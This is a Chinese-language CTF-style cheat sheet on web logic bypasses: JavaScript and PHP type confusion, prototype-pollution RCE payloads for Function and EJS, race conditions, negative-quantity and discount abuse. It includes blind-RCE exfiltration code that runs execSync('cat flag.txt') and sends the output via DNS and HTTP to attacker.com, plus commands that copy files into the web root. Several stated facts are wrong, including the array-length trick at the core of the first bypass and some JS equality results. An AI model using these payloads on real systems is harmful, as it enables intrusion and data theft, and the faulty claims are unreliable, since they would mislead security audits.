# 业务逻辑绕过秘笈

## JavaScript类型混淆漏洞

### JavaScript类型转换在安全审计中的重要性
```javascript
// 数组与字符串拼接时会将数组转换为字符串，这种特性可被用于绕过类型检查和安全验证
// 绕过原理：当代码使用+运算符进行字符串拼接时，如果操作数包含数组，JavaScript会调用数组的toString()方法

// 基础特性：
['a'] + 'b'  // = 'ab' (数组toString后拼接)
['a'] == 'a' // = false (类型不同，数组 != 字符串)
['a'] === 'a' // = false (类型不同)

// 组合利用：
const a = ['flag'];
const b = 'flag';

a !== b  // true (类型不同，满足!=条件)
a.length === b.length  // true (都是length=4)
a + md5Secret === b + md5Secret  // true (拼接后相同)

// 攻击场景 - 绕过哈希检查：
if(a !== b && a.length === b.length && md5(a+flag) === md5(b+flag)) {
    // 条件不应该满足，但因为类型混淆而满足
}
```

### 利用方法
```javascript
// 通过URL参数传递数组
// 利用length属性的兼容性
// 利用拼接时的类型转换

// 示例：
// 请求：?a[]=flag_value&b=flag_value
// 解析结果：
// a = ['flag_value'] (数组)
// b = 'flag_value' (字符串)
// a !== b 成立（类型不同）
// a.length === b.length 成立（都是11）
// ['flag_value'] + secret 拼接后 = 'flag_valuesecret'
// 与 'flag_value' + secret 都相同，md5相同
```

### Node.js参数解析特性
```javascript
// Express.js等框架在解析URL参数时的特殊行为
// 如果参数名包含[]，会被解析为数组

// 参数：?a[]=x&b=x
// 解析结果：
// req.query.a = ['x']  (数组)
// req.query.b = 'x'    (字符串)

// 利用技巧：
if (req.query.a !== req.query.b &&
    req.query.a.length === req.query.b.length &&
    md5(req.query.a + flag) === md5(req.query.b + flag)) {
    // 条件满足，绕过检查
}

// 攻击流程：
// 1. 构造请求：?a[]=flag_value&b=flag_value
// 2. a被解析为['flag_value']（数组）
// 3. b是'flag_value'（字符串）
// 4. a !== b成立（类型不同）
// 5. a.length === b.length成立（都是11）
// 6. ['flag_value'] + secret拼接后 = 'flag_valuesecret'
// 7. 与'flag_value' + secret都相同，md5相同
```

## 原型链污染导致RCE

### 原型链污染导致RCE的完整利用链
```javascript
// 通过污染Object原型设置query属性，在Function(query)(query)中执行恶意代码实现RCE
// 绕过原理：通过copy()或merge()函数污染Object原型、污染模板引擎的配置属性、模板引擎渲染时执行污染后的恶意代码

// 利用方法：
// 1. 通过Function构造器实现RCE
Object.prototype.query = 'return process.mainModule.require("child_process").execSync("cat flag.txt")';
Function(query)(query);

// 2. 通过EJS模板引擎污染实现RCE
Object.prototype.outputFunctionName = 'x;process.mainModule.require("child_process").execSync("cat flag.txt");var y';
// EJS渲染时会执行污染后的代码

// 利用步骤：
// 1. 找到可以污染Object原型的函数（copy、merge等）
// 2. 污染模板引擎的配置属性
// 3. 触发模板渲染，执行恶意代码
```

### 双重原型链污染
```javascript
// 当目标对象不是直接继承Object，而是有中间层对象时，需要污染多层原型链
// 示例：
function A() {}
function B() {}
B.prototype = new A();
var obj = new B();

// 需要同时污染A.prototype和Object.prototype
A.prototype.polluted = 'value1';
Object.prototype.polluted = 'value2';
```

## EJS模板引擎污染

### EJS模板引擎污染的不同利用方式
```javascript
// 方法一：污染outputFunctionName
// EJS使用outputFunctionName生成输出函数，污染后可在函数体中执行任意代码
Object.prototype.outputFunctionName = 'x;process.mainModule.require("child_process").execSync("cat flag.txt");var y';

// 方法二：污染Code/Block类型
// 污染EJS编译时的Code或Block对象，在编译过程中执行恶意代码
Object.prototype.Code = function() {
    process.mainModule.require("child_process").execSync("cat flag.txt");
};

// 快速定位技巧：
// - 检查模板引擎类型（EJS、Handlebars、Mustache等）
// - 搜索污染点（copy、merge、Object.assign等函数）
// - 验证利用链（污染 → 模板渲染 → 代码执行）
```

### 框架参数解析差异
```javascript
// 不同框架对参数的处理不同

// Express/Connect：
// ?name=john&name=jane
// req.query.name = 'jane' (最后一个)

// 某些框架可能返回数组或对象
// 利用这种差异绕过类型检查

if (typeof params.id === 'number' && params.id === 123) {
    // 检查通过
}

// 攻击：
// 某些框架将id解析为['123']
// typeof ['123'] !== 'number'
// 但['123'].toString() == '123'
```

### 松散比较导致的混淆
```javascript
// JavaScript的==会进行类型强制转换
// 但某些比较行为意外

'0' == 0  // true
'0' == false  // true
'' == 0  // true

// 更复杂的混淆
[] == false  // true
[] == ''  // true
[] == 0  // false! (这个很容易出错)

// 利用场景：
if (input == expectedValue) {  // 松散比较
    approve();
}

// 攻击：
// 某些输入可能与多个值==相等
```

## 类型混淆和类型强制转换

### 松散比较陷阱 (==)
```php
// PHP松散比较会进行类型转换
0 == 'string'           // true (字符串转0)
0 == '0'                // true
0 == 'a'                // true ('a'转0)

null == false           // true
null == 0               // true

false == ''             // true
false == '0'            // true

// 数组比较
array() == null         // false (这个很容易出错！)
array() == false        // false
```

### 严格比较 (===) 的安全性
```php
0 === 'string'          // false (类型不同)
0 === '0'               // false (类型不同)

// 正确的防御方式
if ($id === 0) { ... }  // 同时检查类型
if (is_int($id) && $id === 0) { ... }
```

## 运算符优先级滥用

### and/or 优先级陷阱
```php
$result = true or false;    // $result = true (or的优先级低)
$result = true || false;    // $result = true (||的优先级高)

$result = false and true;   // $result = false (and的优先级低)
$result = false && true;    // $result = false (&&的优先级高)

// 赋值优先级低于and/or，高于||/&&
$a = true or false;         // $a = true, 执行 $a = true，然后 true or false
```

### 数学运算优先级
```php
$a = 2 + 3 * 4;             // 14 (乘法优先)
$a = '5' + 3;               // 8 (字符串转数字)
$a = '5' . 3;               // '53' (字符串连接)
```

## 数值型漏洞

### intval()函数的第二参数（进制）
```php
intval('10', 8);            // 8 (八进制10)
intval('10', 16);           // 16 (十六进制10)
intval('10', 2);            // 2 (二进制10)

// 攻击：如果直接用intval()而不指定进制
intval('0x10');             // 0 (不自动识别十六进制，返回0)
intval('010');              // 10 (不自动识别八进制)
```

### 浮点数精度问题
```php
0.1 + 0.2 == 0.3            // false! (0.30000000000000004)

// 金额计算陷阱
$price = 0.1 + 0.2;         // 0.30000000000000004
if ($price == 0.3) { ... }  // false，条件不成立

// 防御
if (abs($price - 0.3) < 0.0001) { ... }
```

## 条件竞争和时间窗口

### 检查-使用(TOCTOU)漏洞
```php
// 线程1检查
if (file_exists('/uploads/file.txt')) {     // 时间点A
    // 线程2在此时修改或删除文件
    readfile('/uploads/file.txt');          // 时间点B - 可能失败或读到不同内容
}
```

### 竞争条件利用
```php
// 不安全的令牌验证
$token = $_GET['token'];
if (isValidToken($token)) {                 // 检查
    useToken($token);                       // 使用
    // 如果两个请求并发执行，可能同一个token被使用多次
}

// 防御：原子操作
if (isValidAndUseToken($token)) { ... }    // 一次性检查和消费
```

## 整数溢出和下溢

### 32位/64位整数边界
```php
$max = 2147483647;          // 32位最大值
$overflow = $max + 1;       // 可能溢出或转float

// 数组长度检查绕过
$len = 2147483647;          // 整数最大值
if ($len < 0x1000) { ... }  // 判断失败
$array = array_pad([], $len, 0);  // OOM或溢出
```

### 金额计算溢出
```php
$price = 999999999999999;   // 大数字
$total = $price * $quantity; // 可能溢出
```

## 验证码和令牌漏洞

### 固定验证码
```php
// 弱点：验证码不随机
$code = date('Ymd');        // 每天相同
$code = md5('static_salt');  // 固定值

// 攻击：预先计算所有可能的验证码
```

### 验证码重用
```php
// 弱点：验证码验证后未删除
if (verifyCode($userCode)) {
    // 同一个验证码可被反复利用
    processPayment();
}

// 防御
if (verifyAndConsumeCode($userCode)) { ... }
```

### 时间戳验证不足
```php
// 弱点：仅验证时间戳格式，不检查有效期
$timestamp = $_GET['ts'];
if (is_numeric($timestamp)) {
    processAction($timestamp);  // 可使用任意过期时间戳
}
```

## 业务逻辑黑洞

### 负数处理不当
```php
// 库存检查
if ($stock - $order_qty >= 0) {
    $stock -= $order_qty;
}

// 攻击：$order_qty = -100
// 结果：$stock += 100 (库存增加！)
```

### 折扣叠加
```php
// 多个折扣可能重复应用
$price = 100;
$price *= 0.9;  // 90折
$price *= 0.9;  // 再90折
// 最终：81元（而非90元）

// 攻击：使用多个优惠码实现多次叠加
```

### 金额转换漏洞
```php
// 币种转换不正确
$usd_price = 100;
$cny_price = $usd_price * 6.5;      // 650

// 攻击：如果存在反向操作且不验证
$refund_usd = (int)($cny_price / 6.5);  // 可能= 99或101
```

## 无回显RCE和数据窃取

### 外带数据通道
```javascript
// Node.js中的无回显RCE利用

// 方法1：DNS外带（需要控制DNS）
const dns = require('dns');
const result = require('child_process').execSync('cat flag.txt').toString();
dns.lookup(Buffer.from(result).toString('hex') + '.attacker.com', () => {});
// DNS日志中可看到编码的flag

// 方法2：HTTP外带
const http = require('http');
const result = require('child_process').execSync('cat flag.txt').toString();
http.get('http://attacker.com/collect?flag=' + Buffer.from(result).toString('base64'));
```

### 文件写入获取结果
```javascript
// 将命令执行结果写入可访问的文件

const fs = require('fs');
const result = require('child_process').execSync('cat flag.txt').toString();
fs.writeFileSync('/var/www/html/result.txt', result);
// 攻击者访问http://target/result.txt获取flag

// 或写入图片/文档伪装
fs.writeFileSync('/var/www/html/image.png', result);
```

### 盲打RCE - 时间侧通道
```javascript
// 利用时间延迟逐字符猜解

// 目标代码：
if (flag[position] === guessChar) {
    // 计算密集操作造成延迟
    for(let i = 0; i < 1000000; i++) {}
}

// 攻击脚本：
for (let pos = 0; pos < flag.length; pos++) {
    for (let code = 33; code < 127; code++) {
        const char = String.fromCharCode(code);
        const start = Date.now();
        // 发送请求 ?pos=pos&char=char
        const elapsed = Date.now() - start;

        if (elapsed > 1000) {  // 延迟表示字符匹配
            flagGuess += char;
            break;
        }
    }
}

// 注：基于时间的盲注效果受网络延迟影响，稳定性一般
```

### 特殊命令处理
```bash
# 当某些命令被过滤时的替代方案

# tee命令：读取并同时写入文件
cat flag.txt | tee /var/www/html/1.txt

# nl/cat命令组合
nl flag.txt | head -n 50 > /tmp/output.txt

# 使用awk逐行处理
awk '{print NR, $0}' flag.txt > /var/www/html/lines.txt

# 文件操作命令（在writeup中常见）
cp flag.txt /var/www/html/copy.txt
mv flag.txt /var/www/html/moved.txt

# 结合输出重定向
cat flag.txt >&2  # 输出到stderr，可能被日志记录
cat flag.txt >1.jpg  # 伪装为图片
```

## 快速定位和利用

**关键词识别**：
- 使用==而非===进行比较
- and/or与赋值混用
- 整数运算无边界检查
- 时间敏感操作无原子性
- 验证码/令牌无过期机制
- 库存/金额计算允许负数
- 参数包含[]导致数组解析（JavaScript）
- 类型强制转换检查不足

**类型混淆检测**：
```javascript
// 检查是否存在数组参数和类型比较的组合
if (Array.isArray(input) || typeof input === 'object') {
    // 可能存在类型混淆
}

// 尝试参数变形
?param=value  // 字符串
?param[]=value  // 数组
?param[key]=value  // 对象
```

**测试优先级**：
1. 类型混淆（==陷阱）
2. JavaScript数组+字符串拼接（Node.js）
3. 整数溢出（负数、大数）
4. 验证码重用（检查是否消费）
5. 条件竞争（并发请求）
6. 金额折扣（多次应用）
7. 无回显RCE（外带、文件写入）

## 防御检查清单

- ✓ 使用===而非==进行比较
- ✓ 明确指定intval()的进制参数
- ✓ 浮点数比较使用epsilon方法
- ✓ 验证码/令牌验证后立即删除
- ✓ 关键操作使用事务或锁
- ✓ 整数操作检查溢出
- ✓ 库存、余额等敏感数据无允许负数
- ✓ 复杂业务逻辑添加审计日志
